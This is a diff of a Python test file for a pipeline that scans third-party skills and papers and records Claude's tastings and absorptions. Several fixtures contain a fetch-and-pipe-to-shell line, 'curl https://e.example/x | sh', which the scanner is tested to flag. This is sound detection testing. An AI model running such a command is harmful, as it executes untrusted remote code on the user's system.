@@ -353,7 +353,12 @@ class BuildEffectPlanTests(unittest.TestCase):
         small = core.validate_policy(1_000, 2_000, ["no-api-keys"])
         self.assertTrue(core.decide_plan("fixture", derived, policy=small)["status"].startswith("exceeds standing policy"))
         risky = core.derive([scan({"a/SKILL.md": skill("a"), "x.sh": b"curl https://e.example | sh\n", "LICENSE": MIT})])
-        self.assertTrue(core.decide_plan("fixture", risky)["status"].startswith("blocked"))
+        # D28: flags inform; the plan goes on to the tasting and triage is an optional step, not a block.
+        risky_plan = core.decide_plan("fixture", risky)
+        self.assertEqual(risky_plan["status"], "waiting for standing policy")
+        self.assertEqual(next(s for s in risky_plan["steps"] if s["id"] == "T2a")["state"], "optional")
+        blocked = core.derive([scan({"skills/a/SKILL.md": skill("a"), "LICENSE": MIT})], [{"kind": "block", "reason": "not for us"}])
+        self.assertEqual(core.decide_plan("fixture", blocked)["status"], "blocked: the owner blocked this food")
         self.assertFalse(waiting["paid_runs_enabled"])
 
     def test_only_stage_0_and_1_count_against_the_cap_and_stage_2_always_asks(self):
@@ -624,7 +629,7 @@ class PipelineTests(unittest.TestCase):
     def test_stage_table_is_defined_once_and_planned_stages_offer_nothing(self):
         self.assertEqual(core.PIPELINE_ORDER, ("intake", "quarantine", "static", "plan", "review", "test", "sort", "approve", "build"))
         planned = [s for s in core.PIPELINE_STAGES if s["automation"] == "planned"]
-        self.assertEqual([s["id"] for s in planned], ["review", "test"])
+        self.assertEqual([s["id"] for s in planned], ["review"])  # D28: Claude's tastings make 實測 mixed
         for stage in core.PIPELINE_STAGES:
             self.assertIn(stage["automation"], core.PIPELINE_AUTOMATION)
             self.assertTrue(stage["decisions"] and all(d.startswith("D") for d in stage["decisions"]))
@@ -664,7 +669,7 @@ class PipelineTests(unittest.TestCase):
         self.assertEqual(pipeline["details"], [{"stage": "plan", "id": "plan", "label_zh": "看計畫"}])
         self.assertEqual(pipeline["parity"]["label"], "parity vs food alone: not tested")
         self.assertEqual(card["components"][0]["level"], "static-measured")
-        # With an A/B covering the text, the part waits for the owner at 核准.
+        # With an A/B covering the text, the part is absorbable at 核准, where Claude rebuilds it (D21).
         card, pipeline = self.place([scan(self.CLEAN), ab("skill:a")])
         self.assertEqual(self.summary(pipeline), ("approve", "current", ["absorb", "forget"]))
         self.assertEqual(list(pipeline["stages"].values()), ["done", "done", "done", "partial", "planned", "done", "partial", "current", "todo"])
@@ -681,8 +686,9 @@ class PipelineTests(unittest.TestCase):
     def test_risky_toxic_stale_and_inedible_foods_stop_where_the_problem_is(self):
         record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
         _card, pipeline = self.place([record])
-        self.assertEqual(self.summary(pipeline), ("static", "blocked", ["triage", "forget"]))
-        self.assertIn("高嚴重度旗標待你分流", pipeline["note_zh"])
+        self.assertEqual(self.summary(pipeline), ("static", "current", ["triage", "forget"]))
+        self.assertIn("高嚴重度旗標：只供參考，不擋這樣食物", pipeline["note_zh"])
+        self.assertEqual(pipeline["actions"][0]["label_zh"], "分流旗標（可選，終端確認碼）")
         flag = next(f["id"] for f in record["flags"] if f["severity"] == "high")
         toxic = [{"food": "a", "kind": "triage", "flag": flag, "outcome": "confirm-toxic", "reason": "r"}]
         _card, pipeline = self.place([record], toxic)
@@ -701,7 +707,8 @@ class PipelineTests(unittest.TestCase):
         card, pipeline = self.place([record])
         self.assertEqual(card["verdict"]["headline"], "untested")
         self.assertEqual(self.summary(pipeline), ("sort", "current", ["forget"]))
-        self.assertRegex(pipeline["note_zh"], r"^暫留 2 個成分：缺的測試還在規劃中")
+        self.assertRegex(pipeline["note_zh"], r"^暫留 2 個成分：下一步 Claude 在試吃區試吃")
+        self.assertEqual(pipeline["waiting_on"], "agent")
 
     def test_built_restored_away_and_removed_parts_sit_on_the_build(self):
         record = dict(scan(self.CLEAN), recorded_at="2026-11-03T01:00:00Z")
@@ -797,7 +804,7 @@ class PipelineTests(unittest.TestCase):
         self.assertEqual(sum(text.count("名稱碰撞") for text in steps.values()), 1)
 
     def test_partial_marks_passed_stages_whose_planned_steps_never_ran(self):
-        self.assertEqual(core.PARTIAL_STAGES, {"plan", "sort", "build"})
+        self.assertEqual(core.PARTIAL_STAGES, {"plan", "test", "sort", "build"})
         history_only = scan({"README.md": b"# notes\n", "skills/b/run.sh": b"#!/bin/sh\necho hi\n", "skills/b/SKILL.md": skill("b"), "LICENSE": MIT})
         _card, pipeline = self.place([history_only, self.imported()])
         self.assertEqual((pipeline["stage"], pipeline["stages"]["plan"], pipeline["stages"]["sort"]), ("approve", "partial", "partial"))
@@ -861,25 +868,35 @@ class PipelineTests(unittest.TestCase):
         _card, pipeline = self.place([self.imported()], lifecycle="found", origin="import")
         blocker = check(pipeline, "owner", "入口：還沒送去試吃")
         self.assertEqual((blocker["basis_zh"][1], blocker["unknown_zh"]), (core.BLOCKER_BASIS_ZH["import"], []))
+        # D28: a failed taste is Claude's to look into, not the owner's.
         _card, pipeline = self.place(lifecycle="found", last_error={"at": "t", "error": "git fetch failed", "error_zh": "抓不到"})
-        check(pipeline, "owner", "封存：試吃失敗（抓不到）")
-        # A clean skill waits at 分流 for the planned A/B: nothing moves it today, and the parts say what they miss.
+        self.assertEqual(check(pipeline, "agent", "封存：試吃失敗（抓不到）")["unknown_zh"], [core.AGENT_WHEN_ZH])
+        # A clean skill waits at 分流 for Claude's tasting (D25, D28), and the parts say what they miss.
         _card, pipeline = self.place([scan(self.CLEAN)])
-        blocker = check(pipeline, "planned", "分流：暫留 2 個成分")
+        blocker = check(pipeline, "agent", "分流：暫留 2 個成分；下一步：Claude 在試吃區試吃")
         self.assertEqual(blocker["basis_zh"], [core.BLOCKER_BASIS_ZH["D17"], "缺：Elephant 提案（方法待辦）（1 個成分）",
-                                              "缺：行為 A/B（付費）：模型面向的文字要過 A/B 才能吸收（D17）（1 個成分）", "和單吃食物比：未測（D16）"])
-        self.assertEqual(blocker["unknown_zh"], ["缺的測試什麼時候會自動跑：v0 沒有排程，也沒有時間表"])
-        # A high-severity flag: the owner, with the flag named from the card's own flag list.
+                                              "缺：行為 A/B（付費）：模型面向的文字要過 A/B 才能吸收（D17）（1 個成分）",
+                                              core.BLOCKER_BASIS_ZH["D25"], "和單吃食物比：未測（D16）"])
+        self.assertEqual(blocker["unknown_zh"], [core.AGENT_WHEN_ZH])
+        # D28: a high-severity flag informs the rebuild and the goldfish review; the food waits on Claude at 靜態,
+        # the flag is still named from the card's own flag list, and triage stays an optional terminal action.
         record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
         _card, pipeline = self.place([record])
-        blocker = check(pipeline, "owner", "靜態：1 個高嚴重度旗標待你分流")
-        self.assertEqual(blocker["basis_zh"], [core.BLOCKER_BASIS_ZH["D7-static"], "F-PIPE install.sh:2：把下載的內容直接交給 shell 執行"])
+        self.assertEqual((pipeline["stage"], pipeline["state"]), ("static", "current"))
+        blocker = check(pipeline, "agent", "靜態：1 個高嚴重度旗標（只供參考）；下一步：Claude 在試吃區試吃")
+        self.assertEqual(blocker["basis_zh"], [core.BLOCKER_BASIS_ZH["D28-static"], "F-PIPE install.sh:2：把下載的內容直接交給 shell 執行"])
+        self.assertIn("分流是可選的", blocker["basis_zh"][0])
+        self.assertIn("不能照原樣複製", blocker["if_ignored_zh"])
+        self.assertEqual([(a["id"], a["where"]) for a in pipeline["actions"]], [("triage", "terminal"), ("forget", "both")])
         flag = next(f["id"] for f in record["flags"] if f["severity"] == "high")
         _card, pipeline = self.place([record], [{"food": "a", "kind": "triage", "flag": flag, "outcome": "confirm-toxic", "reason": "r"}])
         check(pipeline, "none", "沒有卡點：你確認有毒，整樣排掉")
-        # With its A/B the skill waits for the owner at 核准; once built it rests; removed, only optional decisions are left.
+        # With its A/B the skill is absorbable: Claude rebuilds it under D21 (copying is an optional owner action);
+        # once built it rests; removed, only optional decisions are left.
         _card, pipeline = self.place([scan(self.CLEAN), ab("skill:a")])
-        self.assertEqual(check(pipeline, "owner", "核准：1 個成分等你決定要不要吸收")["basis_zh"], [core.BLOCKER_BASIS_ZH["D11"]])
+        blocker = check(pipeline, "agent", "核准：1 個成分可以吸收；Claude 依 D21 重建成 OAW 程式和測試")
+        self.assertEqual(blocker["basis_zh"], [core.BLOCKER_BASIS_ZH["D21"], core.BLOCKER_BASIS_ZH["D11"]])
+        self.assertEqual(pipeline["actions"][0]["label_zh"], "照原樣複製吸收（可選）…")
         built = dict(scan(self.CLEAN), recorded_at="2026-11-03T01:00:00Z")
         absorbed = [{"food": "a", "kind": "absorb", "components": ["skill:a"], "outcome": "installed", "build": "2.0.0+build.2.abcdef0",
                      "at": "2026-11-03T02:00:00Z"}]
@@ -888,11 +905,11 @@ class PipelineTests(unittest.TestCase):
         removed = absorbed + [{"food": "a", "kind": "remove", "components": ["skill:a"], "reason": "r", "at": "2026-11-03T03:00:00Z"}]
         _card, pipeline = self.place([built, ab("skill:a")], removed, {"components": {}})
         check(pipeline, "optional", "沒有卡點：你移除了它")
-        # A sealed paper without components waits for the planned Elephant split; nothing is invented meanwhile.
+        # A sealed paper without units waits for Claude to split it as the Elephant; the engine invents nothing.
         _card, pipeline = self.place([paper_record()], source={"kind": "paper", "url": "https://arxiv.org/abs/2606.03979", "arxiv_id": "2606.03979"})
-        blocker = check(pipeline, "planned", "靜態：論文的成分還沒拆")
+        blocker = check(pipeline, "agent", "靜態：論文的單位還沒拆；Claude 接手")
         self.assertEqual(blocker["basis_zh"], [core.BLOCKER_BASIS_ZH["paper"]])
-        self.assertEqual(blocker["unknown_zh"], ["Elephant 替論文拆成分什麼時候做好：沒有排程，紀錄裡也沒寫"])
+        self.assertEqual(blocker["unknown_zh"], [core.AGENT_WHEN_ZH])
 
     def test_a_question_brief_carries_the_food_facts(self):
         card, _pipeline = self.place([scan(self.CLEAN)])
@@ -903,12 +920,12 @@ class PipelineTests(unittest.TestCase):
             "關於 OAW 消化道的問題（2026-11-04T01:02:03Z，問題編號 ab12cd34）",
             "食物：x/a（a，repo）",
             "來源：https://github.com/x/a @ aaaaaaa",
-            "問的時候在：分流（現在：分流 · 目前 · 等規劃中的步驟（還沒自動化））",
+            "問的時候在：分流（現在：分流 · 目前 · 自動（Claude 接手））",
             "說明：" + card["pipeline"]["note_zh"],
-            "卡在哪：分流：暫留 2 個成分",
+            "卡在哪：分流：暫留 2 個成分；下一步：Claude 在試吃區試吃",
             "依據：" + "；".join(card["pipeline"]["blocker"]["basis_zh"]),
             "你不處理會怎樣：" + card["pipeline"]["blocker"]["if_ignored_zh"],
-            "紀錄沒寫的：缺的測試什麼時候會自動跑：v0 沒有排程，也沒有時間表",
+            "紀錄沒寫的：" + core.AGENT_WHEN_ZH,
             f"成分：吸收 {counts['absorb']}、暫留 {counts['hold']}、排掉 {counts['excrete']} · 判定 未測（靜態量測）",
             "問題：不處理會怎樣？"])
         # A paper's source is its arXiv version plus the sha256 of the sealed PDF; a local repository keeps its path private.
@@ -1099,6 +1116,246 @@ class PaperTests(unittest.TestCase):
         self.assertEqual((card["pipeline"]["stage"], card["paper"]["from"], card["paper"]["title"][:21]), ("intake", "imported", "Language Models Need "))
         repo = core.food_card({"id": "r", "source": {"kind": "github"}}, [], [])
         self.assertEqual((repo["kind"], repo["paper"], repo["pinned"]["version"]), ("repo", None, None))
+
+
+def tasting_doc(**overrides):
+    """An agent tasting as Claude writes it (schema oaw-tasting/1), shaped like the ERPNext graphify tasting."""
+    doc = {"schema": core.TASTING_SCHEMA, "date": "2026-11-05",
+           "records": {"branch": "records", "path": "records/digestion-2026-11-03/taste-graphify/erpnext", "commit": "93e555b"},
+           "protocol": {"models": ["claude-opus-5-5"], "corpus": "ERPNext at a pinned commit", "repeats": 1,
+                        "questions": {"count": 4, "sha256": "b" * 64, "file": "questions.json"}, "grading": "blind zero-context grader"},
+           "arms": [{"id": "N", "label": "native", "food_arm": False, "runs": 4, "graded_runs": 4,
+                     "results": {"coverage": 0.933, "essential_correct": 4, "essential_total": 4, "wrong_claims": 2, "token_median": 69438}},
+                    {"id": "G", "label": "graphify 0.9.102", "food_arm": True, "runs": 4, "graded_runs": 4,
+                     "results": {"coverage": 0.933, "essential_correct": 4, "essential_total": 4, "wrong_claims": 1, "token_median": 95592}}],
+           "food_arm_ran": {"graded_runs": 4, "evidence": "out/grades.jsonl"},
+           "verdict": "not-shown-better", "verdict_zh": "覆蓋率相同，每題 token 中位數多 38%：沒證明比原生好"}
+    doc.update(overrides)
+    return doc
+
+
+def no_food_arm(**overrides):
+    """A tasting whose food arm never ran (the court-skill case: the host's safety layer blocked it)."""
+    arms = [{"id": "N", "food_arm": False, "runs": 4, "graded_runs": 4}, {"id": "C", "food_arm": True, "runs": 0, "graded_runs": 0}]
+    return tasting_doc(**{"arms": arms, "food_arm_ran": {"graded_runs": 0}, **overrides})
+
+
+def stored(doc, food="a", at="2026-11-05T10:00:00Z", kind="tasting", tastings=()):
+    """A record as `catalog.py record-tasting/record-absorption --apply` stores it."""
+    if kind == "tasting":
+        record = core.validate_tasting(doc, food)
+        return {**record, "tasting_id": core.tasting_id(record), "recorded_at": at, "provenance": "agent-tasting", "source_sha256": "0" * 64}
+    record = core.validate_absorption(doc, food, tastings)
+    return {**record, "absorption_id": core.absorption_id(record), "recorded_at": at, "provenance": "agent-absorption",
+            "source_sha256": "0" * 64}
+
+
+def absorption_doc(**overrides):
+    doc = {"schema": core.ABSORPTION_SCHEMA, "date": "2026-11-05", "branch": "claude/oaw-2",
+           "absorbed": [{"id": "sl.wake-sleep-cycle/manual-pass", "name": "wiki_sync.py memory-check", "tier": "A",
+                         "commits": ["b14c875", "656c539"], "tests": ["tests/test_wiki_sync.py::MemoryCheckTests"],
+                         "evidence": {"basis": "tier A: mechanism only, static evidence allowed by D17/D21"}}],
+           "declined": [{"id": "sl.dreaming-loop", "reason": "background self-rewriting loop, excluded by v2"}],
+           "held": [{"id": "sl.synaptic-pruning", "reason": "waits for OAW-20 supersede markers"}]}
+    doc.update(overrides)
+    return doc
+
+
+class AgentRecordTests(unittest.TestCase):
+    """D28: Claude's tastings and D21 absorptions in the ledger, and who each food waits on afterwards."""
+
+    CLEAN = PipelineTests.CLEAN
+    place = PipelineTests.place
+    summary = PipelineTests.summary
+    imported = PipelineTests.imported
+
+    def test_waiting_vocabulary_has_agent_and_release_and_owner_keeps_its_meaning(self):
+        self.assertEqual(list(core.PIPELINE_WAITING_ZH), ["owner", "agent", "release", "optional", "planned", "none"])
+        self.assertEqual(core.PIPELINE_WAITING_ZH["agent"], "自動（Claude 接手）")
+        self.assertEqual(core.PIPELINE_WAITING_ZH["release"], "等發布（合併 PR 時一次決定）")
+        table = core.pipeline_table()
+        self.assertEqual((table["waiting_order"], table["waiting_zh"]), (list(core.PIPELINE_WAITING_ZH), core.PIPELINE_WAITING_ZH))
+        self.assertIn("agent", core.PIPELINE_AUTOMATION)
+        self.assertIn(("Claude 在試吃區試吃：題目先凍結、每一組（原生、食物、OAW 版本）都跑、盲評，記成試吃紀錄", "agent"),
+                      [(st["label_zh"], st["automation"]) for st in next(s for s in core.PIPELINE_STAGES if s["id"] == "test")["steps"]])
+
+    def test_high_flags_wait_on_claude_at_static_and_still_hold_copying(self):
+        record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
+        card, pipeline = self.place([record])
+        self.assertEqual((pipeline["stage"], pipeline["state"], pipeline["waiting_on"]), ("static", "current", "agent"))
+        self.assertEqual(card["verdict"]["headline"], "risky")  # the safety signal stays
+        flagged = [c for c in card["components"] if c["reason_code"] == "high-flags"]
+        self.assertTrue(flagged and all(c["missing_code"] == "triage" and not c["can_absorb"] for c in flagged))
+        self.assertIn("triage", [a["id"] for a in pipeline["actions"]])
+        # Once Claude has tasted it, the flags no longer hold the food at 靜態: the tasting moves it on.
+        card, pipeline = self.place([record, stored(tasting_doc())])
+        self.assertEqual((pipeline["stage"], pipeline["waiting_on"]), ("sort", "none"))
+        self.assertEqual(card["verdict"]["headline"], "risky")
+
+    def test_a_verdict_without_a_graded_food_arm_run_is_refused(self):
+        for verdict in ("absorb", "plug-in", "decline", "not-shown-better"):
+            with self.subTest(verdict=verdict), self.assertRaisesRegex(core.RecordError, "no verdict without the food arm"):
+                core.validate_tasting(no_food_arm(verdict=verdict), "a")
+        # The record cannot claim graded food-arm runs its arm does not have, or ran more than it graded.
+        with self.assertRaisesRegex(core.RecordError, "does not match the food arm"):
+            core.validate_tasting(no_food_arm(food_arm_ran={"graded_runs": 4}), "a")
+        with self.assertRaisesRegex(core.RecordError, "exactly one arm must be the food arm"):
+            core.validate_tasting(tasting_doc(arms=[{"id": "N", "food_arm": False, "runs": 1, "graded_runs": 1}]), "a")
+        with self.assertRaisesRegex(core.RecordError, "graded_runs .* is more than its runs"):
+            core.validate_tasting(tasting_doc(arms=[{"id": "G", "food_arm": True, "runs": 1, "graded_runs": 2}],
+                                              food_arm_ran={"graded_runs": 2}), "a")
+        with self.assertRaisesRegex(core.RecordError, "must say what blocks it"):
+            core.validate_tasting(no_food_arm(verdict="no-verdict"), "a")
+        with self.assertRaisesRegex(core.RecordError, "unknown field"):
+            core.validate_tasting(tasting_doc(blocked_on_onwer="typo"), "a")
+        with self.assertRaisesRegex(core.RecordError, "names another food"):
+            core.validate_tasting(tasting_doc(food="b"), "a")
+        self.assertEqual(core.validate_tasting(no_food_arm(verdict="no-verdict", notes="arm C did not start"), "a")["verdict"], "no-verdict")
+        self.assertTrue(core.zh_error("Refused: no verdict without the food arm installed and run (D28)").startswith("拒收"))
+
+    def test_a_hand_edited_or_hand_written_record_is_refused_when_the_view_is_built(self):
+        good = stored(tasting_doc())
+        edited = dict(good, verdict="absorb")
+        card, pipeline = self.place([scan(self.CLEAN), edited])
+        self.assertEqual((card["tastings"], pipeline["stage"]), ([], "sort"))
+        self.assertIn("edited after it was recorded", card["records_refused"][0]["reason"])
+        # A verdict whose food arm never ran is refused even with a matching id written by hand.
+        forged = no_food_arm(verdict="absorb")
+        record = {k: forged[k] for k in forged}
+        record.update(food="a", food_arm="C", blocked_on_owner=None, notes=None, provenance="agent-tasting", tasting_id="t-" + "0" * 12)
+        card, _pipeline = self.place([scan(self.CLEAN), record])
+        self.assertEqual(card["tastings"], [])
+        self.assertEqual(len(card["records_refused"]), 1)
+
+    def test_no_verdict_waits_on_claude_or_on_the_owner_when_blocked_on_owner(self):
+        blocked = stored(no_food_arm(verdict="no-verdict", verdict_zh="食物組沒跑：沒有判定",
+                                     blocked_on_owner="本機的安全分類器擋下在試吃區執行食物程式：要你給一條限定試吃區的常設規則（D28 第 6 點）"))
+        card, pipeline = self.place([scan(self.CLEAN), blocked])
+        self.assertEqual((pipeline["stage"], pipeline["state"], pipeline["waiting_on"]), ("test", "blocked", "owner"))
+        self.assertTrue(pipeline["blocker"]["where_zh"].startswith("實測：試吃沒有判定，等你：本機的安全分類器"))
+        self.assertEqual(pipeline["blocker"]["basis_zh"][:2], [core.BLOCKER_BASIS_ZH["D28-verdict"], "食物組 C：評分過的執行 0 次"])
+        self.assertEqual(pipeline["stages"]["sort"], "todo")
+        self.assertNotIn("sort", pipeline["stage_notes_zh"])
+        self.assertIn("試吃 2026-11-05：N 4 次（評分 4）、C 0 次（評分 0，食物組）", pipeline["stage_notes_zh"]["test"])
+        rerun = stored(no_food_arm(verdict="no-verdict", verdict_zh="沒有判定", notes="arm C timed out"))
+        _card, pipeline = self.place([scan(self.CLEAN), rerun])
+        self.assertEqual((pipeline["stage"], pipeline["waiting_on"]), ("test", "agent"))
+        self.assertIn("arm C timed out", pipeline["blocker"]["where_zh"])
+
+    def test_a_valid_tasting_shows_its_verdict_on_the_sort_stage(self):
+        card, pipeline = self.place([scan(self.CLEAN), stored(tasting_doc())])
+        self.assertEqual(self.summary(pipeline), ("sort", "done", ["forget"]))
+        self.assertEqual((pipeline["stages"]["test"], pipeline["stages"]["approve"], pipeline["stages"]["build"]), ("done", "skipped", "skipped"))
+        self.assertEqual(pipeline["stage_notes_zh"]["sort"], "試吃判定：沒證明比原生好（不收）（覆蓋率相同，每題 token 中位數多 38%：沒證明比原生好）")
+        self.assertEqual((pipeline["waiting_on"], pipeline["blocker"]["where_zh"]), ("none", "沒有卡點：試吃判定沒證明比原生好（不收）"))
+        self.assertEqual(card["tasting"]["arms"][1]["results"]["token_median"], 95592)
+        for verdict, where in (("absorb", "核准：試吃判定吸收；Claude 依 D21 重建成 OAW 程式和測試"),
+                               ("plug-in", "核准：試吃判定插上；Claude 接上官方版")):
+            with self.subTest(verdict=verdict):
+                _card, pipeline = self.place([scan(self.CLEAN), stored(tasting_doc(verdict=verdict))])
+                self.assertEqual((pipeline["stage"], pipeline["state"], pipeline["waiting_on"]), ("approve", "current", "agent"))
+                self.assertEqual(pipeline["blocker"]["where_zh"], where)
+                self.assertEqual(pipeline["stages"]["test"], "done")
+                self.assertIn("試吃判定：", pipeline["stage_notes_zh"]["sort"])
+        _card, pipeline = self.place([scan(self.CLEAN), stored(tasting_doc(verdict="absorb", blocked_on_owner="a tier-C license choice"))])
+        self.assertEqual(pipeline["waiting_on"], "owner")
+        with self.assertRaisesRegex(core.RecordError, "blocked_on_owner is only for"):
+            core.validate_tasting(tasting_doc(verdict="decline", blocked_on_owner="x"), "a")
+
+    def test_tastings_accumulate_and_the_latest_decides(self):
+        first = stored(no_food_arm(verdict="no-verdict", date="2026-11-04", notes="arm C blocked"), at="2026-11-04T10:00:00Z")
+        second = stored(tasting_doc(date="2026-11-05"), at="2026-11-05T10:00:00Z")
+        card, pipeline = self.place([scan(self.CLEAN), second, first])
+        self.assertEqual([t["date"] for t in card["tastings"]], ["2026-11-04", "2026-11-05"])
+        self.assertEqual((card["tasting"]["verdict"], pipeline["stage"]), ("not-shown-better", "sort"))
+        view = core.build_view({"registry": {"foods": {"a": {"id": "a", "display": "x/a", "origin": "url",
+                                                             "source": {"kind": "github", "url": "https://github.com/x/a"}}}},
+                                "evidence": {"a": [scan(self.CLEAN), first, second]}})
+        self.assertEqual(view["funnel"]["agent_tasted"], 1)
+        self.assertEqual(view["foods"][0]["tasting"]["verdict"], "not-shown-better")
+
+    def test_imported_proposals_alone_are_optional_backlog(self):
+        history_only = scan({"README.md": b"# notes\n", "skills/b/run.sh": b"#!/bin/sh\necho hi\n", "skills/b/SKILL.md": skill("b"), "LICENSE": MIT})
+        _card, pipeline = self.place([history_only, self.imported()])
+        self.assertEqual((pipeline["stage"], pipeline["state"], pipeline["waiting_on"]), ("approve", "current", "optional"))
+        self.assertEqual(pipeline["blocker"]["where_zh"], "沒有卡點：1 個歷史提案可以記成待辦（可選）")
+        paper = core.imported_record("a", paper_docs(), [], "t")
+        _card, pipeline = self.place([paper_record(), paper], source={"kind": "paper", "url": "https://arxiv.org/abs/2606.03979"})
+        self.assertEqual((pipeline["stage"], pipeline["waiting_on"]), ("approve", "optional"))
+        self.assertTrue(pipeline["note_zh"].startswith("可選：2 個歷史提案可以記成待辦"))
+
+    def paper_absorption(self):
+        """The paper fixture's ledger as an absorption record: 1 unit rebuilt, 11 declined, 3 held (one candidate left open)."""
+        units = paper_docs()["components.json"]["components"]
+        return absorption_doc(declined=[{"id": u["id"], "reason": "excreted in the digest"} for u in units if u["disposition"] == "excrete"],
+                              held=[{"id": u["id"], "reason": "held in the digest"} for u in units if u["disposition"] == "hold"])
+
+    def test_a_d21_absorption_puts_a_paper_on_the_build_waiting_for_the_release(self):
+        doc = self.paper_absorption()
+        self.assertEqual((len(doc["declined"]), len(doc["held"])), (11, 3))
+        record = stored(doc, kind="absorption")  # a paper has no food arm, and none is asked for
+        evidence = [paper_record(), core.imported_record("a", paper_docs(), [], "t"), record]
+        source = {"kind": "paper", "url": "https://arxiv.org/abs/2606.03979"}
+        card, pipeline = self.place(evidence, source=source)
+        self.assertEqual((pipeline["stage"], pipeline["state"], pipeline["waiting_on"]), ("build", "current", "release"))
+        self.assertEqual(pipeline["waiting_zh"], "等發布（合併 PR 時一次決定）")
+        self.assertEqual(pipeline["blocker"]["where_zh"], "版本：1 個單位已在 claude/oaw-2 重建，等發布（合併 PR 時一次決定）")
+        self.assertIn("sl.wake-sleep-cycle/manual-pass（A 級）：claude/oaw-2 b14c875、656c539；測試 tests/test_wiki_sync.py::MemoryCheckTests",
+                      pipeline["blocker"]["basis_zh"][1])
+        self.assertEqual(pipeline["blocker"]["basis_zh"][-1], core.BLOCKER_BASIS_ZH["release"])
+        self.assertEqual(pipeline["actions"], [])
+        settled = {c["id"]: (c["d21"] or {}).get("outcome") for r in card["historical"] for c in r["components"]}
+        self.assertEqual(settled["hist:sl.wake-sleep-cycle-manual-pass"], "absorbed")
+        self.assertEqual(sum(1 for v in settled.values() if v is None), 1)  # sl.online-consolidation-gap stays an open proposal
+        self.assertEqual((card["absorption"]["absorbed"], card["absorption"]["declined"], card["absorption"]["held"]), (1, 11, 3))
+        state = {"registry": {"foods": {"a": {"id": "a", "display": "arXiv:2606.03979", "origin": "url", "source": source}}},
+                 "evidence": {"a": evidence}}
+        view = core.build_view(state)
+        self.assertEqual((view["funnel"]["absorbed_parts"], view["funnel"]["rebuilt_units"], view["funnel"]["installed_parts"]), (1, 1, 0))
+        self.assertEqual(view["funnel"]["by_waiting"]["release"], 1)
+        self.assertEqual(view["release_pending"]["foods"], ["a"])
+        self.assertEqual((view["release_pending"]["units"], view["release_pending"]["branches"]), (1, ["claude/oaw-2"]))
+        # Once the owner merges, a record of the release puts the food at rest.
+        released = stored(absorption_doc(release={"state": "released", "pr": "#1"}), at="2026-11-06T10:00:00Z", kind="absorption")
+        _card, pipeline = self.place(evidence + [released], source=source)
+        self.assertEqual((pipeline["stage"], pipeline["waiting_on"]), ("build", "none"))
+        # A tier-C question on a held unit waits on the owner.
+        asks = stored(absorption_doc(blocked_on_owner="sl.synaptic-pruning needs a new runtime dependency (tier C)"),
+                      at="2026-11-07T10:00:00Z", kind="absorption")
+        _card, pipeline = self.place(evidence + [asks], source=source)
+        self.assertEqual(pipeline["waiting_on"], "owner")
+
+    def test_absorption_tiers_follow_d21(self):
+        unit = absorption_doc()["absorbed"][0]
+        tier_b = absorption_doc(absorbed=[dict(unit, tier="B")])
+        with self.assertRaisesRegex(core.RecordError, "A tier-B unit"):
+            core.validate_absorption(tier_b, "a")
+        tasting = stored(tasting_doc(verdict="absorb"))
+        tastings = core.food_records([tasting], "a")["tastings"]
+        with self.assertRaisesRegex(core.RecordError, "A tier-B unit"):
+            core.validate_absorption(tier_b, "a", tastings)
+        named = absorption_doc(absorbed=[dict(unit, tier="B", evidence={"basis": "tasting", "tasting": tasting["tasting_id"]})])
+        self.assertEqual(core.validate_absorption(named, "a", tastings)["absorbed"][0]["tier"], "B")
+        declined = stored(tasting_doc(), at="2026-11-05T11:00:00Z")
+        other = absorption_doc(absorbed=[dict(unit, tier="B", evidence={"basis": "tasting", "tasting": declined["tasting_id"]})])
+        with self.assertRaisesRegex(core.RecordError, "A tier-B unit"):
+            core.validate_absorption(other, "a", core.food_records([declined], "a")["tastings"])
+        with self.assertRaisesRegex(core.RecordError, "A tier-C unit"):
+            core.validate_absorption(absorption_doc(absorbed=[dict(unit, tier="C")]), "a")
+        self.assertTrue(core.validate_absorption(absorption_doc(absorbed=[dict(unit, tier="C", owner_approval="owner in chat 2026-11-05")]), "a"))
+        for broken, message in ((dict(unit, tests=[]), "tests must be a nonempty list"), (dict(unit, commits=["HEAD"]), "commit ids"),
+                                (dict(unit, evidence={}), "evidence.basis must be nonempty")):
+            with self.subTest(message=message), self.assertRaisesRegex(core.RecordError, message):
+                core.validate_absorption(absorption_doc(absorbed=[broken]), "a")
+        with self.assertRaisesRegex(core.RecordError, "listed twice"):
+            core.validate_absorption(absorption_doc(declined=[{"id": unit["id"], "reason": "r"}]), "a")
+        with self.assertRaisesRegex(core.RecordError, "at least one unit"):
+            core.validate_absorption(absorption_doc(absorbed=[], declined=[], held=[]), "a")
+
+    def test_a_decline_only_absorption_rests_at_sort(self):
+        doc = absorption_doc(absorbed=[])
+        _card, pipeline = self.place([scan(self.CLEAN), stored(doc, kind="absorption")])
+        self.assertEqual((pipeline["stage"], pipeline["state"], pipeline["waiting_on"]), ("sort", "done", "none"))
 
 
 if __name__ == "__main__":
